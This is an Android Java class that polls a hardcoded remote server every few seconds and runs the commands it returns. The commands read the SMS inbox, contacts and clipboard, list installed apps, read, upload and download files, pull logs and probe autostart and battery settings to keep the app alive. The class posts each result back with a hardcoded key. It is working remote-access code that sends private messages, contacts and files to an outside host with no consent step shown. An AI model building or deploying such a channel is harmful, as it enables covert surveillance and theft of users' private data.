package com.xita.console;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Arrays;

/**
 * 手机能力通道：轮询服务器指令 → 用本机权限执行 → 回传结果。
 * 指令集：fs.list/stat/mkdir/rename/delete/read/upload/get、clip.get/set、
 * contact.list、sms.list、pkg.list、sys.vibrate/toast/flash/keepalive/rominfo。
 */
public class PhoneChannel {
    private static final String BASE = "https://112.74.84.185.nip.io";
    private static final String POLL_API = BASE + "/api/phone/cmd/poll";
    private static final String RESULT_API = BASE + "/api/phone/cmd/result";
    private static final String KEY = "xita-loc-2026";

    private static File sdRoot() {
        return Environment.getExternalStorageDirectory();
    }

    /** 拉取并执行一轮指令（由 LocationService 每 3 秒调用，运行于后台线程） */
    public static void pollOnce(Context ctx) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(POLL_API).openConnection();
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            conn.setRequestProperty("X-Xita-Key", KEY);
            InputStream in = conn.getInputStream();
            String text = readAll(in);
            in.close();
            conn.disconnect();
            JSONObject resp = new JSONObject(text);
            if (!resp.optBoolean("ok")) {
                return;
            }
            JSONArray cmds = resp.optJSONArray("cmds");
            if (cmds == null) {
                return;
            }
            for (int i = 0; i < cmds.length(); i++) {
                JSONObject c = cmds.getJSONObject(i);
                String id = c.optString("id");
                String action = c.optString("action");
                JSONObject params = c.optJSONObject("params");
                if (params == null) {
                    params = new JSONObject();
                }
                JSONObject result;
                try {
                    result = execute(ctx, action, params);
                } catch (Exception e) {
                    result = new JSONObject();
                    try {
                        result.put("ok", false);
                        result.put("error", String.valueOf(e.getMessage()));
                    } catch (Exception ignored) {
                    }
                }
                postResult(id, result);
            }
        } catch (Exception ignored) {
        }
    }

    private static JSONObject execute(Context ctx, String action, JSONObject p) throws Exception {
        switch (action) {
            case "fs.list": return fsList(p);
            case "fs.stat": return fsStat(p);
            case "fs.mkdir": return fsMkdir(p);
            case "fs.rename": return fsRename(p);
            case "fs.delete": return fsDelete(p);
            case "fs.read": return fsRead(p);
            case "fs.upload": return fsUpload(p);
            case "fs.get": return fsGet(p);
            case "clip.get": return clipGet(ctx);
            case "clip.set": return clipSet(ctx, p);
            case "contact.list": return contactList(ctx, p);
            case "sms.list": return smsList(ctx, p);
            case "pkg.list": return pkgList(ctx);
            case "sys.vibrate": return sysVibrate(ctx, p);
            case "sys.toast": return sysToast(ctx, p);
            case "sys.flash": return sysFlash(ctx, p);
            case "sys.keepalive": return sysKeepalive(ctx);
            case "sys.rominfo": return sysRominfo(ctx);
            case "sys.activities": return sysActivities(ctx, p);
            case "sys.logs": return sysLogs(ctx, p);
            case "sys.wakelock": return sysWakelock(ctx, p);
            case "engine.status": return engineStatus(ctx);
            case "engine.start": return engineStart(ctx, p);
            case "engine.stop": return engineStop(ctx);
            case "engine.download": return engineDownload(ctx, p);
            case "engine.mark": return engineMark(ctx, p);
            default: {
                JSONObject r = new JSONObject();
                r.put("ok", false);
                r.put("error", "unknown action: " + action);
                return r;
            }
        }
    }

    /** 保活体检：电池豁免 / 精确闹钟 / 版本（供服务器远程诊断） */
    private static JSONObject sysKeepalive(Context ctx) throws Exception {
        JSONObject r = new JSONObject();
        r.put("ok", true);
        boolean batt = false;
        try {
            android.os.PowerManager pm =
                    (android.os.PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            batt = pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
        } catch (Exception ignored) {
        }
        r.put("battery_ignored", batt);
        boolean exact = true;
        try {
            android.app.AlarmManager am =
                    (android.app.AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am != null && android.os.Build.VERSION.SDK_INT >= 31) {
                exact = am.canScheduleExactAlarms();
            }
        } catch (Exception ignored) {
        }
        r.put("exact_alarm", exact);
        r.put("model", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
        r.put("android", android.os.Build.VERSION.RELEASE + " (sdk " + android.os.Build.VERSION.SDK_INT + ")");
        boolean notifOn = true;
        try {
            if (android.os.Build.VERSION.SDK_INT >= 33) {
                notifOn = ctx.checkSelfPermission("android.permission.POST_NOTIFICATIONS")
                        == android.content.pm.PackageManager.PERMISSION_GRANTED;
            }
        } catch (Exception ignored) {
        }
        r.put("notif_on", notifOn);
        r.put("wakelock", LocationService.wlHeld);
        try {
            android.content.pm.PackageInfo pi =
                    ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), 0);
            r.put("version", pi.versionName + "(" + pi.versionCode + ")");
        } catch (Exception ignored) {
        }
        return r;
    }

    /** ROM 探针：候选的「自启动/耗电」设置页挨个探测，返回哪些真实存在（供远程定位入口） */
    private static JSONObject sysRominfo(Context ctx) throws Exception {
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("model", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
        r.put("android", android.os.Build.VERSION.RELEASE + " (sdk " + android.os.Build.VERSION.SDK_INT + ")");
        r.put("rom", android.os.Build.DISPLAY);
        String[][] ca = {
                {"自启动1", "com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"},
                {"自启动2", "com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity"},
                {"自启动3", "com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity"},
                {"自启动4", "com.oplus.safecenter", "com.oplus.safecenter.startupapp.StartupAppListActivity"},
                {"自启动5", "com.oplus.safecenter", "com.oplus.safecenter.permission.startup.StartupAppListActivity"},
                {"自启动6", "com.oplus.phonemanager", "com.oplus.phonemanager.startupapp.StartupAppListActivity"},
                {"自启动7", "com.coloros.phonemanager", "com.coloros.phonemanager.startupapp.StartupAppListActivity"},
                {"耗电页1", "com.oplus.battery", "com.oplus.powermanager.fuelgaue.PowerUsageModelActivity"},
                {"耗电页2", "com.coloros.safecenter", "com.coloros.powermanager.fuelgaue.PowerUsageModelActivity"},
        };
        JSONArray arr = new JSONArray();
        for (String[] c : ca) {
            JSONObject o = new JSONObject();
            o.put("tag", c[0]);
            o.put("pkg", c[1]);
            o.put("act", c[2]);
            boolean ok = false;
            try {
                android.content.Intent i = new android.content.Intent();
                i.setComponent(new android.content.ComponentName(c[1], c[2]));
                ok = ctx.getPackageManager().resolveActivity(i, 0) != null;
            } catch (Exception ignored) {
            }
            o.put("ok", ok);
            arr.put(o);
        }
        r.put("targets", arr);
        return r;
    }

    /** 枚举指定包的活动名（默认系统管理类），供远程定位设置入口；param all=true 输出全部 */
    private static JSONObject sysActivities(Context ctx, JSONObject p) throws Exception {
        JSONObject r = new JSONObject();
        r.put("ok", true);
        String[] pkgs;
        JSONArray pa = p.optJSONArray("pkgs");
        if (pa != null && pa.length() > 0) {
            pkgs = new String[pa.length()];
            for (int i = 0; i < pa.length(); i++) {
                pkgs[i] = pa.getString(i);
            }
        } else {
            pkgs = new String[]{"com.oplus.battery", "com.android.settings", "com.coloros.securityguard",
                    "com.oplus.securitypermission", "com.oplus.safecenter", "com.coloros.safecenter"};
        }
        boolean all = p.optBoolean("all", false);
        String[] keys = {"startup", "autostart", "boot", "freeze", "powerusage", "power", "appcontrol", "permission"};
        JSONArray out = new JSONArray();
        for (String pkg : pkgs) {
            JSONObject o = new JSONObject();
            o.put("pkg", pkg);
            JSONArray acts = new JSONArray();
            try {
                android.content.pm.PackageInfo pinfo = ctx.getPackageManager()
                        .getPackageInfo(pkg, android.content.pm.PackageManager.GET_ACTIVITIES);
                if (pinfo.activities != null) {
                    for (android.content.pm.ActivityInfo ai : pinfo.activities) {
                        String n = ai.name == null ? "" : ai.name;
                        if (n.isEmpty()) {
                            continue;
                        }
                        if (all) {
                            acts.put(n);
                            if (acts.length() >= 400) {
                                break;
                            }
                            continue;
                        }
                        String ln = n.toLowerCase(java.util.Locale.US);
                        boolean hit = false;
                        for (String k : keys) {
                            if (ln.contains(k)) {
                                hit = true;
                                break;
                            }
                        }
                        if (hit) {
                            acts.put(n);
                        }
                    }
                }
                o.put("exists", true);
            } catch (Exception e) {
                o.put("exists", false);
            }
            o.put("acts", acts);
            out.put(o);
        }
        r.put("pkgs", out);
        return r;
    }

    /** 抓自家日志尾巴（自动版 logcat）：crash=true 只看崩溃缓冲；否则本进程日志 */
    private static JSONObject sysLogs(Context ctx, JSONObject p) throws Exception {
        JSONObject r = new JSONObject();
        r.put("ok", true);
        int lines = Math.max(20, Math.min(300, p.optInt("lines", 120)));
        StringBuilder sb = new StringBuilder();
        try {
            String[] cmd;
            if (p.optBoolean("crash", false)) {
                cmd = new String[]{"logcat", "-d", "-b", "crash", "-t", String.valueOf(lines)};
            } else {
                cmd = new String[]{"logcat", "-d", "-t", String.valueOf(lines), "--pid=" + android.os.Process.myPid()};
            }
            Process proc = Runtime.getRuntime().exec(cmd);
            java.io.InputStream in = proc.getInputStream();
            byte[] buf = new byte[8192];
            int n;
            long deadline = System.currentTimeMillis() + 4000;
            while (System.currentTimeMillis() < deadline && (n = in.read(buf)) > 0) {
                sb.append(new String(buf, 0, n, "UTF-8"));
                if (sb.length() > 18000) {
                    break;
                }
            }
            proc.destroy();
        } catch (Exception e) {
            r.put("exec_error", String.valueOf(e.getMessage()));
        }
        r.put("log", sb.toString());
        return r;
    }

    /** 远程开关唤醒锁（A/B 实验用）：params {"on": true/false} */
    private static JSONObject sysWakelock(Context ctx, JSONObject p) throws Exception {
        boolean on = p.optBoolean("on", true);
        ctx.getSharedPreferences("xita", Context.MODE_PRIVATE).edit().putBoolean("wl_enabled", on).apply();
        try {
            android.content.Intent i = new android.content.Intent(ctx, LocationService.class);
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                ctx.startForegroundService(i);
            } else {
                ctx.startService(i);
            }
        } catch (Exception ignored) {
        }
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("wl_enabled", on);
        return r;
    }

    /** 引擎模型标记文件：{id, name} → 在 <models>/<id>/ 下创建空标记（白名单校验，防穿越；如 V_PRED/.patch） */
    private static JSONObject engineMark(Context ctx, JSONObject p) throws Exception {
        String id = p.optString("id", "");
        String name = p.optString("name", "");
        if (!id.matches("[A-Za-z0-9_.\\-]{1,64}") || !name.matches("[A-Za-z0-9_.\\-]{1,64}")) {
            throw new Exception("bad id/name");
        }
        File dir = new File(EngineBridge.modelsDir(ctx), id);
        if (!dir.isDirectory()) {
            throw new Exception("model dir not found: " + id);
        }
        File f = new File(dir, name);
        boolean created = f.createNewFile();
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("path", f.getAbsolutePath());
        r.put("created", created);
        return r;
    }

    /** 内置画图引擎：状态 + 模型清单 + 下载进度 + 8081 探活 */
    private static JSONObject engineStatus(Context ctx) throws Exception {
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("models", new JSONArray(EngineBridge.modelsJson(ctx)));
        JSONObject dl = new JSONObject();
        String[] ids = {"illustrious_v16_dmd2", "cyber_realistic_v10_dmd2"};
        for (String id : ids) {
            dl.put(id, EngineBridge.downloadState(ctx, id));
        }
        r.put("downloads", dl);
        boolean api = false;
        try {
            java.net.Socket s = new java.net.Socket();
            s.connect(new java.net.InetSocketAddress("127.0.0.1", 8081), 800);
            s.close();
            api = true;
        } catch (Exception ignored) {
        }
        r.put("api_8081", api);
        r.put("tunnel", EngineTunnel.isUp());
        return r;
    }

    private static JSONObject engineStart(Context ctx, JSONObject p) throws Exception {
        String id = p.optString("id", "illustrious_v16_dmd2");
        String type = p.optString("backendType", "sdxl");
        int w = p.optInt("width", 1024);
        int h = p.optInt("height", 1024);
        EngineBridge.startEngine(ctx, id, type, w, h);
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("started", id);
        return r;
    }

    private static JSONObject engineStop(Context ctx) throws Exception {
        EngineBridge.stopEngine(ctx);
        JSONObject r = new JSONObject();
        r.put("ok", true);
        return r;
    }

    private static JSONObject engineDownload(Context ctx, JSONObject p) throws Exception {
        String id = p.optString("id", "");
        String url = p.optString("url", "");
        JSONObject r = new JSONObject();
        if (id.isEmpty() || url.isEmpty()) {
            r.put("ok", false);
            r.put("error", "need id & url");
            return r;
        }
        EngineBridge.downloadModelAsync(ctx, id, url);
        r.put("ok", true);
        r.put("started", id);
        return r;
    }

    /** 路径安全：必须位于共享存储内（canonical 解析，拒绝穿越） */
    private static File resolve(String path) throws Exception {
        if (path == null || path.isEmpty()) {
            throw new Exception("empty path");
        }
        File f = new File(path);
        String abs = f.getCanonicalPath();
        String sd = sdRoot().getCanonicalPath();
        if (!abs.equals(sd) && !abs.startsWith(sd + "/")) {
            throw new Exception("path outside sdcard");
        }
        return f;
    }

    private static JSONObject fsList(JSONObject p) throws Exception {
        File dir = resolve(p.optString("path", sdRoot().getAbsolutePath()));
        if (!dir.isDirectory()) {
            throw new Exception("not a directory");
        }
        File[] children = dir.listFiles();
        JSONArray arr = new JSONArray();
        if (children != null) {
            Arrays.sort(children, (a, b) -> {
                if (a.isDirectory() != b.isDirectory()) {
                    return a.isDirectory() ? -1 : 1;
                }
                return a.getName().compareToIgnoreCase(b.getName());
            });
            int n = 0;
            for (File c : children) {
                if (n++ >= 1000) {
                    break;
                }
                JSONObject e = new JSONObject();
                e.put("name", c.getName());
                e.put("dir", c.isDirectory());
                e.put("size", c.isDirectory() ? 0 : c.length());
                e.put("mtime", c.lastModified());
                arr.put(e);
            }
        }
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("path", dir.getAbsolutePath());
        r.put("entries", arr);
        r.put("count", arr.length());
        return r;
    }

    private static JSONObject fsStat(JSONObject p) throws Exception {
        File f = resolve(p.optString("path"));
        JSONObject r = new JSONObject();
        r.put("ok", f.exists());
        r.put("path", f.getAbsolutePath());
        r.put("dir", f.isDirectory());
        r.put("size", f.length());
        r.put("mtime", f.lastModified());
        return r;
    }

    private static JSONObject fsMkdir(JSONObject p) throws Exception {
        File f = resolve(p.optString("path"));
        JSONObject r = new JSONObject();
        r.put("ok", f.exists() || f.mkdirs());
        r.put("path", f.getAbsolutePath());
        return r;
    }

    private static JSONObject fsRename(JSONObject p) throws Exception {
        File from = resolve(p.optString("from"));
        File to = resolve(p.optString("to"));
        JSONObject r = new JSONObject();
        r.put("ok", from.renameTo(to));
        r.put("from", from.getAbsolutePath());
        r.put("to", to.getAbsolutePath());
        return r;
    }

    /** 删除 = 移入回收站（/sdcard/.xita_trash），可恢复；保护系统区 */
    private static JSONObject fsDelete(JSONObject p) throws Exception {
        File f = resolve(p.optString("path"));
        String sd = sdRoot().getCanonicalPath();
        String abs = f.getCanonicalPath();
        if (abs.equals(sd)
                || abs.equals(sd + "/Android")
                || abs.startsWith(sd + "/Android/")
                || abs.startsWith(sd + "/.xita_trash")) {
            throw new Exception("protected path");
        }
        if (!f.exists()) {
            throw new Exception("not exists");
        }
        File trash = new File(sd + "/.xita_trash");
        if (!trash.exists()) {
            trash.mkdirs();
        }
        File dst = new File(trash, System.currentTimeMillis() + "_" + f.getName());
        boolean ok = f.renameTo(dst);
        JSONObject r = new JSONObject();
        r.put("ok", ok);
        if (ok) {
            r.put("movedTo", dst.getAbsolutePath());
        } else {
            r.put("error", "rename failed");
        }
        return r;
    }

    /** 读取小文件内容（≤256KB，base64 内联返回） */
    private static JSONObject fsRead(JSONObject p) throws Exception {
        File f = resolve(p.optString("path"));
        long max = Math.min(p.optLong("max", 65536), 262144);
        if (!f.isFile()) {
            throw new Exception("not a file");
        }
        if (f.length() > max) {
            throw new Exception("too big (" + f.length() + "), use fs.upload");
        }
        byte[] data = new byte[(int) f.length()];
        FileInputStream in = new FileInputStream(f);
        int off = 0;
        while (off < data.length) {
            int n = in.read(data, off, data.length - off);
            if (n < 0) {
                break;
            }
            off += n;
        }
        in.close();
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("size", data.length);
        r.put("b64", android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP));
        return r;
    }

    /** 手机 → 服务器中转库 */
    private static JSONObject fsUpload(JSONObject p) throws Exception {
        File f = resolve(p.optString("path"));
        if (!f.isFile()) {
            throw new Exception("not a file");
        }
        String name = p.optString("name", f.getName());
        HttpURLConnection conn = (HttpURLConnection) new URL(
                BASE + "/api/phone/fs/blob?name=" + URLEncoder.encode(name, "UTF-8")).openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(120000);
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setFixedLengthStreamingMode(f.length());
        conn.setRequestProperty("X-Xita-Key", KEY);
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        FileInputStream in = new FileInputStream(f);
        OutputStream out = conn.getOutputStream();
        byte[] buf = new byte[65536];
        int n;
        while ((n = in.read(buf)) > 0) {
            out.write(buf, 0, n);
        }
        out.close();
        in.close();
        int code = conn.getResponseCode();
        conn.disconnect();
        JSONObject r = new JSONObject();
        r.put("ok", code == 200);
        r.put("name", name);
        r.put("size", f.length());
        if (code != 200) {
            r.put("error", "http " + code);
        }
        return r;
    }

    /** 服务器中转库 → 手机（path 为目录则存为该目录下同名文件） */
    private static JSONObject fsGet(JSONObject p) throws Exception {
        File dst = resolve(p.optString("path"));
        String name = p.optString("name");
        if (name.isEmpty()) {
            throw new Exception("no name");
        }
        HttpURLConnection conn = (HttpURLConnection) new URL(
                BASE + "/api/phone/fs/blob?name=" + URLEncoder.encode(name, "UTF-8") + "&key=" + KEY).openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(120000);
        InputStream in = conn.getInputStream();
        if (dst.isDirectory()) {
            dst = new File(dst, name);
        }
        File parent = dst.getParentFile();
        if (parent != null && !parent.exists()) {
            parent.mkdirs();
        }
        OutputStream out = new FileOutputStream(dst);
        byte[] buf = new byte[65536];
        int n;
        long total = 0;
        while ((n = in.read(buf)) > 0) {
            out.write(buf, 0, n);
            total += n;
        }
        out.close();
        in.close();
        conn.disconnect();
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("path", dst.getAbsolutePath());
        r.put("size", total);
        return r;
    }

    private static JSONObject clipGet(Context ctx) throws Exception {
        JSONObject r = new JSONObject();
        ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm == null || !cm.hasPrimaryClip() || cm.getPrimaryClip() == null
                || cm.getPrimaryClip().getItemCount() == 0) {
            r.put("ok", false);
            r.put("error", "empty");
            return r;
        }
        CharSequence t = cm.getPrimaryClip().getItemAt(0).coerceToText(ctx);
        r.put("ok", true);
        r.put("text", t == null ? "" : t.toString());
        return r;
    }

    private static JSONObject clipSet(Context ctx, JSONObject p) throws Exception {
        ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm == null) {
            throw new Exception("no clipboard");
        }
        cm.setPrimaryClip(ClipData.newPlainText("xita", p.optString("text")));
        JSONObject r = new JSONObject();
        r.put("ok", true);
        return r;
    }

    private static JSONObject contactList(Context ctx, JSONObject p) throws Exception {
        int limit = Math.min(p.optInt("limit", 200), 1000);
        JSONArray arr = new JSONArray();
        Cursor cur = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cur != null) {
            while (cur.moveToNext() && arr.length() < limit) {
                JSONObject e = new JSONObject();
                e.put("name", cur.getString(0));
                e.put("number", cur.getString(1));
                arr.put(e);
            }
            cur.close();
        }
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("contacts", arr);
        r.put("count", arr.length());
        return r;
    }

    private static JSONObject smsList(Context ctx, JSONObject p) throws Exception {
        int limit = Math.min(p.optInt("limit", 20), 200);
        JSONArray arr = new JSONArray();
        Cursor cur = ctx.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address", "body", "date"},
                null, null, "date DESC");
        if (cur != null) {
            while (cur.moveToNext() && arr.length() < limit) {
                JSONObject e = new JSONObject();
                e.put("from", cur.getString(0));
                e.put("body", cur.getString(1));
                e.put("ts", cur.getLong(2));
                arr.put(e);
            }
            cur.close();
        }
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("messages", arr);
        r.put("count", arr.length());
        return r;
    }

    private static JSONObject pkgList(Context ctx) throws Exception {
        JSONArray arr = new JSONArray();
        java.util.List<android.content.pm.ApplicationInfo> apps =
                ctx.getPackageManager().getInstalledApplications(0);
        for (android.content.pm.ApplicationInfo ai : apps) {
            if (arr.length() >= 300) {
                break;
            }
            JSONObject e = new JSONObject();
            e.put("pkg", ai.packageName);
            e.put("label", String.valueOf(ctx.getPackageManager().getApplicationLabel(ai)));
            e.put("sys", (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
            arr.put(e);
        }
        JSONObject r = new JSONObject();
        r.put("ok", true);
        r.put("apps", arr);
        return r;
    }

    private static JSONObject sysVibrate(Context ctx, JSONObject p) throws Exception {
        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        long ms = Math.max(50, Math.min(5000, p.optLong("ms", 500)));
        if (v != null) {
            v.vibrate(ms);
        }
        JSONObject r = new JSONObject();
        r.put("ok", true);
        return r;
    }

    private static JSONObject sysToast(final Context ctx, JSONObject p) throws Exception {
        final String text = p.optString("text");
        new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                try {
                    Toast.makeText(ctx, text, Toast.LENGTH_LONG).show();
                } catch (Exception ignored) {
                }
            }
        });
        JSONObject r = new JSONObject();
        r.put("ok", true);
        return r;
    }

    private static JSONObject sysFlash(Context ctx, JSONObject p) throws Exception {
        android.hardware.camera2.CameraManager cm =
                (android.hardware.camera2.CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        if (cm == null) {
            throw new Exception("no camera service");
        }
        String camId = null;
        for (String id : cm.getCameraIdList()) {
            android.hardware.camera2.CameraCharacteristics cc = cm.getCameraCharacteristics(id);
            Boolean flash = cc.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
            if (flash != null && flash) {
                camId = id;
                break;
            }
        }
        if (camId == null) {
            throw new Exception("no flash");
        }
        cm.setTorchMode(camId, p.optBoolean("on", true));
        JSONObject r = new JSONObject();
        r.put("ok", true);
        return r;
    }

    private static void postResult(String id, JSONObject result) {
        try {
            JSONObject body = new JSONObject();
            body.put("id", id);
            body.put("ok", result.optBoolean("ok"));
            body.put("data", result);
            HttpURLConnection conn = (HttpURLConnection) new URL(RESULT_API).openConnection();
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(20000);
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("X-Xita-Key", KEY);
            OutputStream os = conn.getOutputStream();
            os.write(body.toString().getBytes("UTF-8"));
            os.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {
        }
    }

    private static String readAll(InputStream in) throws Exception {
        java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
        byte[] buf = new byte[16384];
        int n;
        while ((n = in.read(buf)) > 0) {
            bo.write(buf, 0, n);
        }
        return bo.toString("UTF-8");
    }
}
